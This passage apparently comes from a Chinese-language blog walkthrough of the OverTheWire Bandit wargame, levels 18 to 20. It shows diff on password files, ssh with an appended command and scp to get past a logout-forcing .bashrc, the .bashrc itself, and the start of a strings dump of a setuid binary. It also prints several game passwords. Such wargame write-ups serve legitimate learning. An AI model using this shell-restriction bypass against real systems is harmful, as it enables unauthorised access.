class="line">lsp7PdEBOlGtgQaiZA1BMdxpHPA0YPCt</span><br><span class="line">fZPxMUd4y9F8Ty8W36yMVQRVxJ7M1n4B</span><br><span class="line">rNnhvIf0O32W7YkNFetirVBSHpxx8PVa</span><br><span class="line">IAvk989y4J29tuDjZlSUAcQJ0GKlSLA7</span><br><span class="line">6h32PPx4KHY0pxOVSViJDOzjaidS79i5</span><br><span class="line">3bCdLIIpnsFeobeQnORAVeM7dwvlRhYc</span><br><span class="line">VlaVTJjuHSNlmnukU27pLKfjQDcpFm0R</span><br><span class="line">jVxCHhuF6NHsDa6UdNHgBdNIDH7SZzCE</span><br><span class="line">tY71skfE2Y1Tez1451HdcwjueU9wWO9S</span><br><span class="line">JUplInoYI9VmMuoTU64WX9fQgljz0SRr</span><br><span class="line">YCScjMB7OB5QL8ZiPgyd7wRqlsqhjjGu</span><br><span class="line">3fBUnc3gvyg7iyW1V4D0quYJPM3iNNy4</span><br><span class="line">mrbw5khrpkAXdNfkTs6Eqzj8Am07I4CK</span><br><span class="line">crz9kBtBVlvTVZnvJ3AqfeFYuw89koZh</span><br><span class="line">uD036o50sDvVj9JU0ZMi76np4kE2SLw6</span><br><span class="line">6QX3T8Ul4qgruVmX0Vx8h7H8GkTyAoZ1</span><br><span class="line">EbdKERioX8ShHYhFCIFVIyvP13kL75jA</span><br><span class="line">QyRSUG1osue0Rrc114FF98YH7HjJWPgJ</span><br><span class="line">jMxInIjNK0ChvSQX10862VqCwIQsek95</span><br><span class="line">2pqtLZiT8CzsalDfnn68FjdhbtgqEK1C</span><br><span class="line">80JH1LNM5JFed5XQBVYeiKU5qNNqDjLS</span><br><span class="line">bandit17@bandit:~$ strings passwords.new</span><br><span class="line">4d22drdsITVoHcfd8bAHeeKrdL3mMHpU</span><br><span class="line">QeGg8ya1PGU13yp57EWuUaxErl8VWjlM</span><br><span class="line">CUGTwQyhKs4fEQLH0UdD7ywCrYBDceZ7</span><br><span class="line">2hUdQXUPpBJKzkslSHCOiC3ytdJ1cuqI</span><br><span class="line">WxgyH7990nLi81smXOeDGnKTpZTlAU3f</span><br><span class="line">g4diRjbnq4PhyC1rfuCaFXZmBLgHPmo6</span><br><span class="line">MBf7rFYTik6DurpaVdC5mXngsTiXWwhv</span><br><span class="line">3zt8L6QnDKXLGWhRvQBUczrk6O5KLl7i</span><br><span class="line">bm9g6Ypy9zVLojtpPaKBKViAKnL19QEY</span><br><span class="line">N2rkdeuoi1RBXCiCDQWlk4BU76M3wJFv</span><br><span class="line">PR0AOkN4NodK61ewgBHS56sEDr3LAobb</span><br><span class="line">CaVTEQzrWPuDvBm9D4CGL8BSC4arizFq</span><br><span class="line">FgheNL06s1UCW8UiuFUWSmtGedi2TxIH</span><br><span class="line">Lvh1gpC39tdJMAJH0atjJLF4yRlCoSH4</span><br><span class="line">OpTHYem6UHMY2zLgwm2sI4e1faHw0M1b</span><br><span class="line">Z84471LxMWArPnxJGsMmvvl2qCcBXZ7M</span><br><span class="line">CExYI7LMdZLSj9AiFp8rutQY6uIcqdfx</span><br><span class="line">lC1IFZxlnj05ZuWKY5Ytad9bTZ0eMgYC</span><br><span class="line">4OfOZR4CMqlUFgxw8nZbKtW3eJcZPrqn</span><br><span class="line">bbctuDOWMvYUCWAiY7APEUnYPUo0zYiT</span><br><span class="line">sCepFVPJBglEuU8uY0LllG1oIJ2HOvrH</span><br><span class="line">o9sp7odH3blIlshg2aCrWPdzuDq5lxx5</span><br><span class="line">97Vd3224QGOfsPGwjURphDfn7ISeXd3S</span><br><span class="line">Tz97n5taD1ZskKSlC1WHDU1CZZ5I3PnM</span><br><span class="line">NDkYNzqHAZnjn7GoKk6kUjmBwLbZ5IjT</span><br><span class="line">pd1THzlzKbAnR9uPnI75EpXdZVUFyVD9</span><br><span class="line">GGwbSfJpRjzYvNHb1n2riVU3VnxCSe9I</span><br><span class="line">qLufXtxv2XKcjrWDqIojlINiJhU9LYCp</span><br><span class="line">kpxAYarBToFo4Vsr1jDBQREvRtbUA9i2</span><br><span class="line">s8ZEkk0YuNoA9YnyUvVwFy29cMIP4psJ</span><br><span class="line">m0q33SCpHDBfTL2yRb8Db2lb6qIX8hjf</span><br><span class="line">xhHqvStzyrj0k1eLNbiQHmadzlY80iZg</span><br><span class="line">FExGbU63PyeJsfxtoIaVjiFKXAhEon0C</span><br><span class="line">04y09Cd0CvZBSnrC1BjauTj70D3P84Gw</span><br><span class="line">Kr58zsSpmfKy4ILtUqbo2hqooPHnI13L</span><br><span class="line">ruisEF4OA3MyOdLEFwVdW84ZwJXRioRT</span><br><span class="line">kN2hWkHUehtqqWpnZW1CulYiOv8RJwPl</span><br><span class="line">V045YMJnMGdta9yQD8ALdny0hholXmdw</span><br><span class="line">gZ5U640FLMMChheWKHNdaQ1lKzLuqjxZ</span><br><span class="line">Al0xVJb5bEzhnFG8nPFe6IJa2FjXVSzo</span><br><span class="line">CT2ZJy6MoLkTqdHuhL5zUIsW41WCntAA</span><br><span class="line">kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</span><br><span class="line">46lUvvv0JJzyY0IOhWgGp5IjfsllmvaC</span><br><span class="line">FcSd4Me936rwbk2pAU9ylx9NXTrzdCaX</span><br><span class="line">vfU4mCzATtqUMNLg3a7mPs3OY6Dr4jaZ</span><br><span class="line">mOWgkKPfjXibrdfgG57CWMcbeqBRg4IU</span><br><span class="line">VudOaCtkUbhOdF7dE7KACOqH0R9weDhQ</span><br><span class="line">vzwsuF0cp5IrmEmGb7qNr4VUlsLi463t</span><br><span class="line">ymAqpKh2CPdC7iqFk4KcKdlXeKZqSrhW</span><br><span class="line">ta02hN70k7BoxfiVn7viAFoWKaGDOKnC</span><br><span class="line">bPLvqxn5BDtg4wy8c2uO0x7y3yi3RPMU</span><br><span class="line">VUcDEAfnRTt8nTlAd55q94L6rr0jfCCU</span><br><span class="line">QAIDBC5fx4bBOsyOd8NYItiPWGMaGXY9</span><br><span class="line">X1NUQJrIsrNfaGHMUolOcepDiNss842e</span><br><span class="line">DAL411ARIMja2B3VibQxzNn8iqxCvtPB</span><br><span class="line">Gq0BvsinoaBAuqwLJwtWCSe1wMdiSBSZ</span><br><span class="line">RVO0eC5aK1WRlpKqPAglNSOPwc1OvUp8</span><br><span class="line">XCBD77G8bknfL90F44o0Nbe1jqCBvxqh</span><br><span class="line">qOZOpK7UHdGgsZeQirx8wr9omjopkzuP</span><br><span class="line">nQ1IO5OUcJ4P8ZSrLYNQLFnWS32AMUcE</span><br><span class="line">oUpDAclcfOrSI10qeUCHqxvSxR0aXyrN</span><br><span class="line">uzPVdEpMDIvTBj3eB4mgmhEeCg1WEFqL</span><br><span class="line">WThihtgEnlmNQ6SAqROgERjyxNfgJZk5</span><br><span class="line">l9sPHyleBjYNlZxQbHiCKNoeEfL7W3RA</span><br><span class="line">qfcmi6vHWL5CS7nqkHTcSdeRIoxDEGjU</span><br><span class="line">cI4zMnmzAP4Ei6FvZQ4vgvUhrhKYajGH</span><br><span class="line">MlKrQsbeU3cvq0GNIvwSMipBFUCHRLb4</span><br><span class="line">yqPoTs4J1oNw6KqREjqQk1fXNxAtQzNN</span><br><span class="line">6HgQNDvsu4VC7KBhIpQRCIRhLo4izRjG</span><br><span class="line">nPhoiXgdg3T385gjubCcKtnEa2kSQYiF</span><br><span class="line">BBWqlFI2IycHpCSESbmi8bgQ3XaRVkH9</span><br><span class="line">zC5qgaooKVu5QNTtqEXcgPpmX2IXZcd5</span><br><span class="line">BP8DJZaleBMYuyMzG96xJ6RDk6QUvLoi</span><br><span class="line">NsYnz4oTlDRKsDyWWVvseAeLnrVz80ul</span><br><span class="line">2MVRp5Pej7Ngv3QlcfY9MhFrpm1EER3U</span><br><span class="line">niQz99Dp18DDLdpkqxatJEorlEuxbffD</span><br><span class="line">0LZ5juRJ7Kpn9Y1d2tnXjZY5Qe5YsoSn</span><br><span class="line">DFkA6xfENw4qcgbyJOR1Lq4wHzoEzXf1</span><br><span class="line">DuyGtXuifUSHgURCvn8wW8ZVGkMFEwCG</span><br><span class="line">lsp7PdEBOlGtgQaiZA1BMdxpHPA0YPCt</span><br><span class="line">fZPxMUd4y9F8Ty8W36yMVQRVxJ7M1n4B</span><br><span class="line">rNnhvIf0O32W7YkNFetirVBSHpxx8PVa</span><br><span class="line">IAvk989y4J29tuDjZlSUAcQJ0GKlSLA7</span><br><span class="line">6h32PPx4KHY0pxOVSViJDOzjaidS79i5</span><br><span class="line">3bCdLIIpnsFeobeQnORAVeM7dwvlRhYc</span><br><span class="line">VlaVTJjuHSNlmnukU27pLKfjQDcpFm0R</span><br><span class="line">jVxCHhuF6NHsDa6UdNHgBdNIDH7SZzCE</span><br><span class="line">tY71skfE2Y1Tez1451HdcwjueU9wWO9S</span><br><span class="line">JUplInoYI9VmMuoTU64WX9fQgljz0SRr</span><br><span class="line">YCScjMB7OB5QL8ZiPgyd7wRqlsqhjjGu</span><br><span class="line">3fBUnc3gvyg7iyW1V4D0quYJPM3iNNy4</span><br><span class="line">mrbw5khrpkAXdNfkTs6Eqzj8Am07I4CK</span><br><span class="line">crz9kBtBVlvTVZnvJ3AqfeFYuw89koZh</span><br><span class="line">uD036o50sDvVj9JU0ZMi76np4kE2SLw6</span><br><span class="line">6QX3T8Ul4qgruVmX0Vx8h7H8GkTyAoZ1</span><br><span class="line">EbdKERioX8ShHYhFCIFVIyvP13kL75jA</span><br><span class="line">QyRSUG1osue0Rrc114FF98YH7HjJWPgJ</span><br><span class="line">jMxInIjNK0ChvSQX10862VqCwIQsek95</span><br><span class="line">2pqtLZiT8CzsalDfnn68FjdhbtgqEK1C</span><br><span class="line">80JH1LNM5JFed5XQBVYeiKU5qNNqDjLS</span><br><span class="line">bandit17@bandit:~$ diff passwords.old passwords.new </span><br><span class="line">42c42</span><br><span class="line">&lt; hlbSBPAWJmL6WFDb06gpTx1pPButblOA</span><br><span class="line">---</span><br><span class="line">&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</span><br><span class="line">bandit17@bandit:~$</span><br></pre></td></tr></table></figure><p>这么长肯定不可能用肉眼去代替机器做的事嘛</p><p>所以就用到了<code>diff</code>命令</p><p>&lt;为第一个文件，&gt; 为第二个文件，因此flag为<code>kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</code></p><h3 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">bl@bl-virtual-machine:~/wargame$ ssh bandit18@bandit.labs.overthewire.org -p 2220</span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line"></span><br><span class="line">bandit18@bandit.labs.overthewire.org<span class="string">'s password: </span></span><br><span class="line"><span class="string">#kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</span></span><br><span class="line"><span class="string">Linux bandit 4.18.12 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">      ,----..            ,----,          .---. </span></span><br><span class="line"><span class="string">     /   /   \         ,/   .`|         /. ./|</span></span><br><span class="line"><span class="string">    /   .     :      ,`   .'</span>  :     .--<span class="string">'.  '</span> ;</span><br><span class="line">   .   /   ;.  \   ;    ;     /    /__./ \ : |</span><br><span class="line">  .   ;   /  ` ; .<span class="string">'___,/    ,'</span> .--<span class="string">'.  '</span>   \<span class="string">' .</span></span><br><span class="line"><span class="string">  ;   |  ; \ ; | |    :     | /___/ \ |    '</span> <span class="string">' </span></span><br><span class="line"><span class="string">  |   :  | ; | '</span> ;    |.<span class="string">';  ; ;   \  \;      : </span></span><br><span class="line"><span class="string">  .   |  '</span> <span class="string">' '</span> : `----<span class="string">'  |  |  \   ;  `      |</span></span><br><span class="line"><span class="string">  '</span>   ;  \; /  |     <span class="string">'   :  ;   .   \    .\  ; </span></span><br><span class="line"><span class="string">   \   \  '</span>,  /      |   |  <span class="string">'    \   \   '</span> \ |</span><br><span class="line">    ;   :    /       <span class="string">'   :  |     :   '</span>  |--<span class="string">"  </span></span><br><span class="line"><span class="string">     \   \ .'        ;   |.'       \   \ ;     </span></span><br><span class="line"><span class="string">  www. `---` ver     '---' he       '---"</span> ire.org     </span><br><span class="line">               </span><br><span class="line">              </span><br><span class="line">Welcome to OverTheWire!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Enjoy your stay!</span><br><span class="line"></span><br><span class="line">Byebye !</span><br><span class="line">Connection to bandit.labs.overthewire.org closed.</span><br><span class="line">bl@bl-virtual-machine:~/wargame$</span><br></pre></td></tr></table></figure><p>由上一关提示已经知道了，我们会看到byebye，直接看题目</p><p><code>.bashrc</code>会禁止所有通过ssh登陆的</p><blockquote><p>仅作了解，错误方向</p><p><a href="https://blog.csdn.net/luoluonuoyasuolong/article/details/88806211" target="_blank" rel="noopener">https://blog.csdn.net/luoluonuoyasuolong/article/details/88806211</a></p></blockquote><p>一种方法是利用命令拼接，将命令作为参数传过去，在执行shell之前运行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bl@bl-virtual-machine:~/wargame$ ssh bandit18@bandit.labs.overthewire.org -p 2220 <span class="string">'cat ./readme'</span></span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line"></span><br><span class="line">bandit18@bandit.labs.overthewire.org<span class="string">'s password: </span></span><br><span class="line"><span class="string">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</span></span><br></pre></td></tr></table></figure><p>第二种方式利用scp命令绕过</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bl@bl-virtual-machine:~/wargame$ scp -P 2220  bandit18@bandit.labs.overthewire.org:./readme  ./readme</span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line"></span><br><span class="line">bandit18@bandit.labs.overthewire.org<span class="string">'s password: </span></span><br><span class="line"><span class="string">readme                                        100%   33     0.0KB/s   00:00    </span></span><br><span class="line"><span class="string">bl@bl-virtual-machine:~/wargame$ cat ./readme </span></span><br><span class="line"><span class="string">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</span></span><br><span class="line"><span class="string">bl@bl-virtual-machine:~/wargame$</span></span><br></pre></td></tr></table></figure><p>顺便爬下了他的<code>.bashrc</code>文件，这道题的万恶之源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ~/.bashrc: executed by bash(1) for non-login shells.</span></span><br><span class="line"><span class="comment"># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</span></span><br><span class="line"><span class="comment"># for examples</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If not running interactively, don't do anything</span></span><br><span class="line"><span class="keyword">case</span> $- <span class="keyword">in</span></span><br><span class="line">    *i*) ;;</span><br><span class="line">      *) <span class="built_in">return</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># don't put duplicate lines or lines starting with space in the history.</span></span><br><span class="line"><span class="comment"># See bash(1) for more options</span></span><br><span class="line">HISTCONTROL=ignoreboth</span><br><span class="line"></span><br><span class="line"><span class="comment"># append to the history file, don't overwrite it</span></span><br><span class="line"><span class="built_in">shopt</span> -s histappend</span><br><span class="line"></span><br><span class="line"><span class="comment"># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span></span><br><span class="line">HISTSIZE=1000</span><br><span class="line">HISTFILESIZE=2000</span><br><span class="line"></span><br><span class="line"><span class="comment"># check the window size after each command and, if necessary,</span></span><br><span class="line"><span class="comment"># update the values of LINES and COLUMNS.</span></span><br><span class="line"><span class="built_in">shopt</span> -s checkwinsize</span><br><span class="line"></span><br><span class="line"><span class="comment"># If set, the pattern "**" used in a pathname expansion context will</span></span><br><span class="line"><span class="comment"># match all files and zero or more directories and subdirectories.</span></span><br><span class="line"><span class="comment">#shopt -s globstar</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make less more friendly for non-text input files, see lesspipe(1)</span></span><br><span class="line"><span class="comment">#[ -x /usr/bin/lesspipe ] &amp;&amp; eval "$(SHELL=/bin/sh lesspipe)"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set variable identifying the chroot you work in (used in the prompt below)</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$&#123;debian_chroot:-&#125;</span>"</span> ] &amp;&amp; [ -r /etc/debian_chroot ]; <span class="keyword">then</span></span><br><span class="line">    debian_chroot=$(cat /etc/debian_chroot)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set a fancy prompt (non-color, unless we know we "want" color)</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$TERM</span>"</span> <span class="keyword">in</span></span><br><span class="line">    xterm-color|*-256color) color_prompt=yes;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uncomment for a colored prompt, if the terminal has the capability; turned</span></span><br><span class="line"><span class="comment"># off by default to not distract the user: the focus in a terminal window</span></span><br><span class="line"><span class="comment"># should be on the output of commands, not on the prompt</span></span><br><span class="line"><span class="comment">#force_color_prompt=yes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$force_color_prompt</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; <span class="keyword">then</span></span><br><span class="line">4<span class="comment"># We have color support; assume it's compliant with Ecma-48</span></span><br><span class="line">4<span class="comment"># (ISO/IEC-6429). (Lack of such support is extremely rare, and such</span></span><br><span class="line">4<span class="comment"># a case would tend to support setf rather than setaf.)</span></span><br><span class="line">4color_prompt=yes</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">4color_prompt=</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$color_prompt</span>"</span> = yes ]; <span class="keyword">then</span></span><br><span class="line">    PS1=<span class="string">'$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    PS1=<span class="string">'$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ '</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> color_prompt force_color_prompt</span><br><span class="line"></span><br><span class="line"><span class="comment"># If this is an xterm set the title to user@host:dir</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$TERM</span>"</span> <span class="keyword">in</span></span><br><span class="line">xterm*|rxvt*)</span><br><span class="line">    PS1=<span class="string">"\[\e]0;<span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>\u@\h: \w\a\]<span class="variable">$PS1</span>"</span></span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable color support of ls and also add handy aliases</span></span><br><span class="line"><span class="keyword">if</span> [ -x /usr/bin/dircolors ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">test</span> -r ~/.dircolors &amp;&amp; <span class="built_in">eval</span> <span class="string">"<span class="variable">$(dircolors -b ~/.dircolors)</span>"</span> || <span class="built_in">eval</span> <span class="string">"<span class="variable">$(dircolors -b)</span>"</span></span><br><span class="line">    <span class="built_in">alias</span> ls=<span class="string">'ls --color=auto'</span></span><br><span class="line">    <span class="comment">#alias dir='dir --color=auto'</span></span><br><span class="line">    <span class="comment">#alias vdir='vdir --color=auto'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#alias grep='grep --color=auto'</span></span><br><span class="line">    <span class="comment">#alias fgrep='fgrep --color=auto'</span></span><br><span class="line">    <span class="comment">#alias egrep='egrep --color=auto'</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># colored GCC warnings and errors</span></span><br><span class="line"><span class="comment">#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># some more ls aliases</span></span><br><span class="line"><span class="comment">#alias ll='ls -l'</span></span><br><span class="line"><span class="comment">#alias la='ls -A'</span></span><br><span class="line"><span class="comment">#alias l='ls -CF'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Alias definitions.</span></span><br><span class="line"><span class="comment"># You may want to put all your additions into a separate file like</span></span><br><span class="line"><span class="comment"># ~/.bash_aliases, instead of adding them here directly.</span></span><br><span class="line"><span class="comment"># See /usr/share/doc/bash-doc/examples in the bash-doc package.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f ~/.bash_aliases ]; <span class="keyword">then</span></span><br><span class="line">    . ~/.bash_aliases</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable programmable completion features (you don't need to enable</span></span><br><span class="line"><span class="comment"># this, if it's already enabled in /etc/bash.bashrc and /etc/profile</span></span><br><span class="line"><span class="comment"># sources /etc/bash.bashrc).</span></span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">shopt</span> -oq posix; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ -f /usr/share/bash-completion/bash_completion ]; <span class="keyword">then</span></span><br><span class="line">    . /usr/share/bash-completion/bash_completion</span><br><span class="line">  <span class="keyword">elif</span> [ -f /etc/bash_completion ]; <span class="keyword">then</span></span><br><span class="line">    . /etc/bash_completion</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Byebye !'</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure><h3 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h3><blockquote><p>关于setuid：<a href="https://blog.csdn.net/oo__yan/article/details/7076889" target="_blank" rel="noopener">https://blog.csdn.net/oo__yan/article/details/7076889</a></p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">bandit19@bandit:~$ ls</span><br><span class="line">bandit20-do</span><br><span class="line">bandit19@bandit:~$ ./bandit20-do </span><br><span class="line">Run a <span class="built_in">command</span> as another user.</span><br><span class="line">  Example: ./bandit20-do id</span><br><span class="line">bandit19@bandit:~$ strings bandit20-do </span><br><span class="line">/lib/ld-linux.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">_IO_stdin_used</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">execv</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">__libc_start_main</span><br><span class="line">__gmon_start__</span><br><span class="line">GLIBC_2.0</span><br><span class="line">PTRh0</span><br><span class="line">QVhk</span><br><span class="line">UWVS</span><br><span class="line">t$,U</span><br><span class="line">[^_]</span><br><span class="line">Run a <span class="built_in">command</span> as another user.</span><br><span class="line">  Example: %s id</span><br><span class="line">/usr/bin/env</span><br><span class="line">;*2$<span class="string">"</span></span><br><span class="line"><span class="string">GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516</span></span><br><span class="line"><span class="string">crtstuff.c</span></span><br><span class="line"><span class="string">__JCR_LIST__</span></span><br><span class="line"><span class="string">deregister_tm_clones</span></span><br><span class="line"><span class="string">__do_global_dtors_aux</span></span><br><span class="line"><span class="string">completed.6587</span></span><br><span class="line"><span class="string">__do_global_dtors_aux_fini_array_entry</span></span><br><span class="line"><span class="string">frame_dummy</span></span><br><span class="line"><span class="string">__frame_dummy_init_array_entry</span></span><br><span class="line"><span class="string">bandit20.c</span></span><br><span class="line"><span class="string">__FRAME_END__</span></span><br><span 